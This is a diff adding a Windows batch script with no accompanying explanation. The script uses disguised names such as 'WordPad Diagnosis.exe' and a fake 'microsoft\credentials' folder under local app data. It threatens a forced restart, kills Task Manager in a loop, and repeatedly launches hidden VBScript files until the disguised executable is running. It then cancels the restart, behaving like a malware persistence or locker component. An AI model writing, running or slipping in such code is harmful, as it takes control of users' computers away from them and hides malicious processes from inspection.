@@ -1,0 +1,24 @@
+tasklist /FI "IMAGENAME eq WordPad Diagnosis.exe" 2>NUL | find /I /N "WordPad Diagnosis.exe">NUL
+if "%ERRORLEVEL%"=="0" exit
+if not exist "%appdata%\microsoft\windows\Start Menu\Programs\Maintenance\WordPad Diagnosis.exe" (start "" "%localappdata%\microsoft\credentials\hub.vbs" & exit)
+
+shutdown /r /t 45
+
+tasklist /FI "IMAGENAME eq WordPad Diagnosis.exe" 2>NUL | find /I /N "WordPad Diagnosis.exe">NUL
+if "%ERRORLEVEL%"=="0" goto ga
+
+taskkill /im wlrmdr.exe /f
+start "" "%localappdata%\microsoft\credentials\forceopen.vbs"
+:la
+taskkill /im taskmgr.exe /f
+tasklist /FI "IMAGENAME eq WordPad Diagnosis.exe" 2>NUL | find /I /N "WordPad Diagnosis.exe">NUL
+if "%ERRORLEVEL%"=="0" goto ga
+
+start "" "%localappdata%\microsoft\credentials\forceopen.vbs"
+timeout 1
+goto la
+
+:ga
+shutdown /a
+start "" "%localappdata%\microsoft\credentials\hub.vbs"
+exit
